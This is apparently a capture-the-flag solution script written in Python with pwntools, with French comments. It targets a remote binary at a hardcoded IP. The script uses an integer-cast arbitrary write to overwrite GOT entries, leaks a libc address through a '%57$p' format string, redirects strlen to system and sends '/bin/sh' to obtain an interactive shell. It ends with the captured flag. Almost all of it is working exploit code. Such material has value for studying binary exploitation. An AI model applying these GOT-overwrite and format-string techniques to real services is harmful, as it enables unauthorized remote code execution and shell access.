
from pwn import * 

context.arch= 'amd64'
'''
cast => int to long

arbitrary write
overwrite free got avec main 
puis 
remplacer exit avec main et 
remplacer free avec printf

'''

p = remote("35.180.250.126" ,1337)

free_got = 0x404000 << 32 # exit 0x404048 # free 0x404000
overflow_got_free=  str(free_got).encode()
p.sendline(overflow_got_free)  # free

mainfunct= p64(0x00000401373)
full_got_overwrite = mainfunct   # free
full_got_overwrite+=p64(0x401040) # puts 
full_got_overwrite+=p64(0x401050) #strlen
full_got_overwrite+=p64(0x401060) # stack_check_fail
full_got_overwrite+=p64(0x401070) # printf
full_got_overwrite+=p64(0x401080) # strcspn
full_got_overwrite+=p64(0x401090) # setvbuf
full_got_overwrite+=p64(0x4010a0) # __isoc99_scanf
full_got_overwrite+=p64(0x4010b0) #getline
full_got_overwrite+=p64(0x4010c0) # exit
p.sendline(full_got_overwrite)

# overwrite exit avec main 

free_got = 0x404048 << 32 
overflow_got_free=  str(free_got).encode()
p.sendline(overflow_got_free)  # free
overwrite_only_free_got=p64(0x00401373) # exit overwrite avec main
p.sendline(overwrite_only_free_got)

# overwrite got free avec printf

free_got = 0x404000 << 32 
overflow_got_free=  str(free_got).encode()
p.sendline(overflow_got_free)  # free
puts_got = p64(0x401070)
full_got_overwrite = puts_got   # free
full_got_overwrite+=p64(0x401040) # puts 
full_got_overwrite+=p64(0x401050) #strlen
full_got_overwrite+=p64(0x401060) # stack_check_fail
full_got_overwrite+=p64(0x401070) # printf
full_got_overwrite+=p64(0x401080) # strcspn
full_got_overwrite+=p64(0x401090) # setvbuf
full_got_overwrite+=p64(0x4010a0) # __isoc99_scanf
full_got_overwrite+=p64(0x4010b0) #getline
full_got_overwrite+=p64(0x401373) # exit with main
p.sendline(full_got_overwrite) 

# leak got puts 
p.sendline(b'1000') # random int 
p.sendline(b"%57$p")  # pour leak __libc_start_main+138 
# attention la position dans la stack de "__libc_start_main+138" n'est pas la mÃªme en remote et en local 
p.recvuntil(b'[1000|5|%57$p]')
leak_main = int(p.recv().split(b'TLV')[0],16) # __libc_start_main+138
print("leak_main : ", hex(leak_main))

libc = ELF("libc.so.6")
system_offset =  libc.symbols["system"]
main_138 = libc.symbols["__libc_start_main"]+138
libc_base =leak_main - main_138
print("libc base : ", hex(libc_base))

system_libc = libc_base + system_offset

# overwrite strlen avec system 

# gdb.attach(p,gdbscript='''
# b *main+176
# b* 0x000000004012C8
# b* 0x0040130d
# ''')


free_got = 0x404000 << 32 
overflow_got_free=  str(free_got).encode()
p.sendline(overflow_got_free)  # free

full_got_overwrite = p64(0x401070)   # free
full_got_overwrite+=p64(0x401040) # puts 
full_got_overwrite+=p64(system_libc) #strlen
full_got_overwrite+=p64(0x401060) # stack_check_fail
full_got_overwrite+=p64(0x401070) # printf
full_got_overwrite+=p64(0x401080) # strcspn
full_got_overwrite+=p64(0x401090) # setvbuf
full_got_overwrite+=p64(0x4010a0) # __isoc99_scanf
full_got_overwrite+=p64(0x4010b0) #getline
full_got_overwrite+=p64(0x401373) # exit with main
p.sendline(full_got_overwrite) 
p.sendline(b'1000') # valeur random 
p.sendline(b'/bin/sh')
p.interactive()

# HACKVENS{Typ3_C0nfUs10n1337}
